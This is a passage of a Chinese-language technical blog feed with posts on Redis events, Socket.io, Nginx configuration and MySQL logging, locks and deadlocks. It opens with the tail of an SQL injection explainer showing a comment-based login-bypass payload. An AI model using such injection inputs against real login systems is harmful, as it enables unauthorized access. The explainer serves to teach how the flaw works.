class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39;</span><br></pre></td></tr></table></figure><p>因为<code>--</code>号 后面的所有内容都会被当成注释处理，所以上面的SQL 语句等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;</span><br></pre></td></tr></table></figure><p>无论是上面的哪一种情况，攻击者都能在不知道具体密码的情况下而成功登录。</p><p>这大概就是一个简单的SQL注入产生的完整过程了，这里只是抛砖引玉的介绍了下原理，而实际场景中的SQL 注入当然远远不止这两种。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/github_36032947/article/details/78442189" target="_blank" rel="noopener">SQL 注入常见方式以及检测方法</a></p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Web 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 常见事件整理</title>
      <link href="/redis-common-events-collation/"/>
      <url>/redis-common-events-collation/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来整理 Redis 的常用事件。</p><a id="more"></a><h2 id="客户端事件"><a href="#客户端事件" class="headerlink" title="客户端事件"></a>客户端事件</h2><p>客户端会发出一些事件的状态连接到Redis 服务器。</p><h3 id="Ready"><a href="#Ready" class="headerlink" title="Ready"></a>Ready</h3><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>客户端连接Redis 时，如果出现异常，则会触发Error 事件。</p><h3 id="Connect"><a href="#Connect" class="headerlink" title="Connect"></a>Connect</h3><p>客户端连接至Redis 时，会触发连接事件。</p><h2 id="订阅者事件"><a href="#订阅者事件" class="headerlink" title="订阅者事件"></a>订阅者事件</h2><h3 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h3><p>将接收到来自订阅频道的消息，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client.on(&quot;message&quot;, function (channel, message) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Subscribe"><a href="#Subscribe" class="headerlink" title="Subscribe"></a>Subscribe</h3><p>监听订阅事件，返回订阅频道的订阅数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client.on(&quot;subscribe&quot;, function (channel, count) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="发布-订阅"><a href="#发布-订阅" class="headerlink" title="发布/订阅"></a>发布/订阅</h2><h3 id="Publish"><a href="#Publish" class="headerlink" title="Publish"></a>Publish</h3><p>将信息 <code>message</code> 发送到指定的频道 <code>channel</code> 。</p><p>返回值：接收到信息 <code>message</code> 的订阅者数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUBLISH channel message</span><br></pre></td></tr></table></figure><h3 id="SUBSCRIBE"><a href="#SUBSCRIBE" class="headerlink" title="SUBSCRIBE"></a>SUBSCRIBE</h3><p>订阅给定频道的信息。</p><p>返回值：接收到的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSCRIBE channel [channel ...]</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://redis.readthedocs.io/en/2.4/index.html" target="_blank" rel="noopener">Redis命令参考简体中文版</a></li><li><a href="https://github.com/NodeRedis/node-redis" target="_blank" rel="noopener">A high performance Node.js Redis client</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socket.io 快速上手</title>
      <link href="/socket-io-quick-start/"/>
      <url>/socket-io-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近使用<code>socket.io</code> 和 <code>redis</code> 完成了一些小功能，觉得很实用，所以整理一下<code>socket.io</code>相关的知识。</p><a id="more"></a><h1 id="socket-io-是什么"><a href="#socket-io-是什么" class="headerlink" title="socket.io 是什么"></a><code>socket.io</code> 是什么</h1><p>它是一个服务端与客户端之间建立通讯的工具。</p><p>服务端创建好服务之后，客户端通过主机与之建立连接。然后就可以进行通讯了。</p><p>想要使用好<code>socket.io</code>，一定要理解通讯的概念。通讯一定是双向的，如果客户端能够收到消息，那么在某个地方就一定存在服务端向客户端推送消息。</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>要开始使用<code>socket.io</code>进行开发，需要先安装Node和npm。</p><p>创建一个名为<code>app.js</code>的文件，并添加以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var app &#x3D; require(&#39;express&#39;)();</span><br><span class="line">var http &#x3D; require(&#39;http&#39;).Server(app);</span><br><span class="line">&#x2F;&#x2F; 创建一个附加到http服务器的新socket.io实例</span><br><span class="line">var io &#x3D; require(&#39;socket.io&#39;)(http);</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res)&#123;</span><br><span class="line">  res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.on(&#39;connection&#39;, function(socket)&#123;</span><br><span class="line">  console.log(&#39;a user connected&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.listen(3000, function()&#123;</span><br><span class="line">  console.log(&#39;listening on *:3000&#39;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就完成了一个最简单的<code>socket</code>服务端。</p><p>创建<code>index.html</code> 文件来作为客户端提供服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure><p>创建的服务运行在本地的 <code>3000</code> 端口上，打开浏览器，输入<code>http://localhost:3000</code>进行访问。 </p><h2 id="使用事件"><a href="#使用事件" class="headerlink" title="使用事件"></a>使用事件</h2><p><code>socket.io</code> 的核心理念就是允许发送、接收任意事件和任意数据。任意能被编码为 JSON 的对象都可以用于传输。二进制数据 也是支持的。</p><p>在上面的代码中，我们已经创建了一个服务端的<code>socket.io</code>对象，如果想要能正常通讯，还需要在客户端同样也创建一个<code>socket.io</code>对象。这个脚本由服务端的<code>/socket.io/socket.io.js</code> 提供。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      var socket &#x3D; io();</span><br><span class="line">   &lt;&#x2F;script&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在客户端中建立 <code>socket.io</code> 连接。</p><p>在服务端中添加以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 只有有客户端连接，就会触发这个事件</span><br><span class="line">io.on(&#39;connection&#39;, function(socket) &#123;</span><br><span class="line">   console.log(&#39;A user connected&#39;);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; 只有有客户端断开连接，就会触发这个事件</span><br><span class="line">   socket.on(&#39;disconnect&#39;, function () &#123;</span><br><span class="line">      console.log(&#39;A user disconnected&#39;);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>现在再次访问<code>http://localhost:3000</code>，不仅可以在浏览器中看见<code>hello world</code>，如果刷新浏览器，还能在控制台中看见以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A user connected</span><br><span class="line">A user disconnected</span><br><span class="line">A user connected</span><br></pre></td></tr></table></figure><p>在上面的案例中，我们使用了<code>socket.io</code>的<code>connection</code>和<code>disconnect</code>事件，<code>socket.io</code>还有很多其中事件。 </p><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>在服务端中有以下是保留字：</p><ul><li>Connect</li><li>Message</li><li>Disconnect</li><li>Reconnect</li><li>Ping</li><li>Join and</li><li>Leave</li></ul><p>在客户端中以下是保留字：</p><ul><li>Connect</li><li>Connect_error</li><li>Connect_timeout</li><li>Reconnect, etc</li></ul><h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p>客户端 提供的一些用于处理错误/异常的API。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Connect − When the client successfully connects.</span><br><span class="line"></span><br><span class="line">Connecting − When the client is in the process of connecting.</span><br><span class="line"></span><br><span class="line">Disconnect − When the client is disconnected.</span><br><span class="line"></span><br><span class="line">Connect_failed − When the connection to the server fails.</span><br><span class="line"></span><br><span class="line">Error − An error event is sent from the server.</span><br><span class="line"></span><br><span class="line">Message − When the server sends a message using the send function.</span><br><span class="line"></span><br><span class="line">Reconnect − When reconnection to the server is successful.</span><br><span class="line"></span><br><span class="line">Reconnecting − When the client is in the process of connecting.</span><br><span class="line"></span><br><span class="line">Reconnect_failed − When the reconnection attempt fails.</span><br></pre></td></tr></table></figure><h3 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h3><p>广播意味着向所有连接的客户端发送消息。</p><p>要向所有客户端广播事件，我们可以使用<code>io.sockets.emit</code>方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">var clients &#x3D; 0;</span><br><span class="line">io.on(&#39;connection&#39;, function(socket) &#123;</span><br><span class="line">   clients++;</span><br><span class="line">   io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;);</span><br><span class="line">   socket.on(&#39;disconnect&#39;, function () &#123;</span><br><span class="line">      clients--;</span><br><span class="line">      io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>广播在<code>socket.io</code>中应用的非常多，有广播就意味着有接收。需要在客户端中处理广播事件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      var socket &#x3D; io();</span><br><span class="line">      socket.on(&#39;broadcast&#39;,function(data) &#123;</span><br><span class="line">         document.body.innerHTML &#x3D; &#39;&#39;;</span><br><span class="line">         document.write(data.description);</span><br><span class="line">      &#125;);</span><br><span class="line">   &lt;&#x2F;script&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>可以尝试打开多个浏览器，输入<code>http://localhost:3000</code>，可能会得到以下结果：</p><p><img src="https://www.tutorialspoint.com/socket.io/images/broadcast_to_all.jpg" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.tutorialspoint.com/socket.io/index.htm" target="_blank" rel="noopener">Socket.io Tutorial</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
          <category> Socket.io </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Socket.io </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 常见配置</title>
      <link href="/nginx-common-configuration/"/>
      <url>/nginx-common-configuration/</url>
      
        <content type="html"><![CDATA[<p>最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。</p><a id="more"></a><h2 id="多站点配置"><a href="#多站点配置" class="headerlink" title="多站点配置"></a>多站点配置</h2><p>如果一台服务器，需要配置多套站点，推荐使用 <code>IP + 端口</code>配置站点，然后使用反向代理指向端口。</p><p>站点配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       40001;</span><br><span class="line">    </span><br><span class="line">    location ~ \.php &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多站点配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 站点1 </span><br><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 站点2</span><br><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite2.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理其实已经在上面的配置中出现过了，多站点配置的原理就是利用反向代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite2.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SSL-配置"><a href="#SSL-配置" class="headerlink" title="SSL 配置"></a>SSL 配置</h2><p>申请好证书之后，将其放在服务器上，然后编辑Nginx 配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name  yoursite.com;</span><br><span class="line">  </span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem;  &#x2F;&#x2F; 证书所在路径</span><br><span class="line">    ssl_certificate_key ssl_0123cp_net&#x2F;private.key;  &#x2F;&#x2F; 证书对应的私钥所在路径</span><br><span class="line">  </span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">        index  index.html index.htm index.jsp index.js;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="http重定向"><a href="#http重定向" class="headerlink" title="http重定向"></a>http重定向</h2><p>配置好 <code>https</code>之后，还需要做一件事，才能保证 <code>https</code>能够正常访问。</p><p>因为访问任何一个网站时，默认使用的是<code>http</code>协议，所以需要在<code>Web Server</code>中配置<code>http</code> 自动跳转 <code>https</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name yoursite.com;</span><br><span class="line">  </span><br><span class="line">    listen 80;</span><br><span class="line">    rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 开启 Mysql 日志记录</title>
      <link href="/mac-open-mysql-logging/"/>
      <url>/mac-open-mysql-logging/</url>
      
        <content type="html"><![CDATA[<p>有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。</p><a id="more"></a><ol><li>进入Mysql 命令行</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hlocalhost -uroot -p</span><br></pre></td></tr></table></figure><ol start="2"><li>全局开启普通日志记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;on;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看Mysql 日志文件所在目录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;general_log_file&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719172134.png" alt=""></p><ol start="4"><li>实时查看日志记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f &#x2F;your_mysql_log_file_path</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 行锁原因分析</title>
      <link href="/analysis-of-the-causes-of-mysql-row-lock/"/>
      <url>/analysis-of-the-causes-of-mysql-row-lock/</url>
      
        <content type="html"><![CDATA[<p>这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。</p><a id="more"></a><h1 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h1><p>MySQL有三种锁的级别：页级、表级、行级。</p><ul><li>表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。</li><li>行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。</li><li>页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般</li></ul><p>因为这篇笔记只介绍Mysql 行锁，所以这里不对其他类型的锁做介绍了。</p><h2 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h2><p>InnoDB实现了两种类型的行锁:</p><ul><li>共享锁【S锁】又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。</li><li>排他锁【X锁】又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。</li></ul><blockquote><p>所谓X锁,是事务T对数据A加上X锁时,只允许事务T读取和修改数据A; 所谓S锁,是事务T对数据A加上S锁时,其他事务只能再对数据A加S锁,而不能加X锁,直到T释放A上的S锁</p></blockquote><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><ol><li>首先创建一个 <code>InnoDB</code>类型的数据表，SQL 如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;gap&#96; (</span><br><span class="line">  &#96;id&#96; int(11) DEFAULT NULL,</span><br><span class="line">  KEY &#96;ind_gap_id&#96; (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><ol start="2"><li>创建会话1，开启事务A并执行update 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">update gap set id &#x3D; 30 where id &#x3D; 33;</span><br></pre></td></tr></table></figure><ol start="3"><li>创建会话2，开启事务B并执行另一个update 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">update gap set id &#x3D; 22 where id &#x3D; 20;</span><br></pre></td></tr></table></figure><p>在会话2中 插入<code>20 &gt; id &lt; 39</code>范围外的值时 可以执行成功,而当要插入 <code>[20,39)</code>范围内的值时 会遇到gap lock 。</p><ol start="4"><li>用会话1 查看当前正在进行中的事务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure></li></ol><p>不会意外，能看到下面两条记录：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155146.png" alt=""></p><p>可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。</p><p>这是因为执行update 语句之后，mysql 会执行索引扫描并在该表上施加一个 <code>next-key lock</code> ,向左扫描到20,向右扫描到39 ,锁定区间左闭右开,所以lock的范围是 <code>[20,39)</code>。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>根据实际情况的不同，有不同的方式可以避免死锁，这里介绍常用的几种：</p><ol><li>改变数据库操作逻辑，尽量避免在不同的事务中，对同一条记录进行更改。</li><li>如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/rainy-shurun/p/5166163.html" target="_blank" rel="noopener">Mysql 死锁原因分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 查看死锁和解除死锁</title>
      <link href="/mysql-view-deadlock-and-release-deadlock/"/>
      <url>/mysql-view-deadlock-and-release-deadlock/</url>
      
        <content type="html"><![CDATA[<p>前段时间遇到了一个Mysql 死锁相关的问题，整理一下。</p><a id="more"></a><blockquote><p>问题描述：Mysql 的修改语句似乎都没有生效，同时使用Mysql GUI 工具编辑字段的值时会弹出异常。</p></blockquote><p><img src="https://i.loli.net/2020/06/28/3dXRhKHQWMlearC.png" alt="image.png"></p><h3 id="什么是死锁"><a href="#什么是死锁" class="headerlink" title="什么是死锁"></a>什么是死锁</h3><p>在解决Mysql 死锁的问题之前，还是先来了解一下什么是死锁。</p><p>死锁是指两个或两个以上的进程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等的进程称为死锁进程。</p><h3 id="死锁的表现"><a href="#死锁的表现" class="headerlink" title="死锁的表现"></a>死锁的表现</h3><p>死锁的具体表现有两种：</p><ol><li>Mysql 增改语句无法正常生效</li><li>使用Mysql GUI 工具编辑字段的值时，会出现异常。</li></ol><h3 id="如何避免死锁"><a href="#如何避免死锁" class="headerlink" title="如何避免死锁"></a>如何避免死锁</h3><p>阻止死锁的途径就是避免满足死锁条件的情况发生，为此我们在开发的过程中需要遵循如下原则：</p><p>1.尽量避免并发的执行涉及到修改数据的语句。</p><p>2.要求每一个事务一次就将所有要使用到的数据全部加锁，否则就不允许执行。</p><p>3.预先规定一个加锁顺序，所有的事务都必须按照这个顺序对数据执行封锁。如不同的过程在事务内部对对象的更新执行顺序应尽量保证一致。</p><h3 id="查看死锁"><a href="#查看死锁" class="headerlink" title="查看死锁"></a>查看死锁</h3><p>Mysql 查询是否存在锁表有多种方式，这里只介绍一种最常用的。</p><h4 id="1-查看正在进行中的事务"><a href="#1-查看正在进行中的事务" class="headerlink" title="1. 查看正在进行中的事务"></a>1. 查看正在进行中的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX</span><br></pre></td></tr></table></figure><p>可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155146.png" alt=""></p><h4 id="2-查看正在锁的事务"><a href="#2-查看正在锁的事务" 